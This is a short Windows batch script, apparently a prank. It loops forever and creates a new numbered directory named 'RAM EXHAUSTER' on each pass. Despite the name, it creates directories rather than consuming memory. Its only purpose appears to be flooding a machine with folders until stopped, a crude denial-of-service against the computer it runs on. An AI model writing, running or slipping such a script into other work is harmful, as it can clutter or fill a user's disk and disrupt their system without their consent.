@echo off  
set counter=0
:loop
    set /a counter=%counter%+1
    md "RAM EXHAUSTER %counter%"  
goto loop
